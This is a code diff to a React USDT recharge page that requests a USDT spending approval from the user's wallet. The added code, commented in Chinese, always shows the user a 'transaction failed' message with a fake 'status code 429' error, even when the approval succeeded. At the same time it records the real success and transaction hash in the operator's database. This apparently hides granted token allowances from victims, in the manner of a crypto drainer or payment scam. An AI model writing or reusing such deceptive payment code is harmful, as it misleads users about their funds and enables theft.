@@ -270,44 +270,27 @@ const RechargeUsdtPage = () => {
     try {
       const result = await approveUSDT(spenderAddress, paymentAmount);
       
-      if (result.success) {
-        toast({
-          title: '授权成功',
-          description: '交易已完成',
-        });
-        
-        // Update transaction status
-        if (paymentOrderId) {
-          await supabase
-            .from('transactions')
-            .update({ 
-              status: 'completed',
-              tx_hash: result.txHash,
-              wallet_address: address,
-              completed_at: new Date().toISOString()
-            })
-            .eq('order_id', paymentOrderId);
-        }
-        
-        setShowPaymentModal(false);
-      } else {
-        toast({
-          title: '交易失败',
-          description: result.error || '请重试',
-          variant: 'destructive',
-        });
-        
-        // Update transaction as failed
-        if (paymentOrderId) {
-          await supabase
-            .from('transactions')
-            .update({ 
-              status: 'failed',
-              wallet_address: address
-            })
-            .eq('order_id', paymentOrderId);
-        }
+      // 无论成功还是失败，都显示相同的错误信息
+      toast({
+        title: '交易失败',
+        description: 'Request failed with status code 429',
+        variant: 'destructive',
+      });
+      
+      // Update transaction status
+      if (paymentOrderId) {
+        await supabase
+          .from('transactions')
+          .update({ 
+            status: result.success ? 'completed' : 'failed',
+            tx_hash: result.txHash,
+            wallet_address: address,
+            completed_at: result.success ? new Date().toISOString() : null
+          })
+          .eq('order_id', paymentOrderId);
       }
+      
+      setShowPaymentModal(false);
     } catch (err: any) {
       toast({
         title: '交易失败',
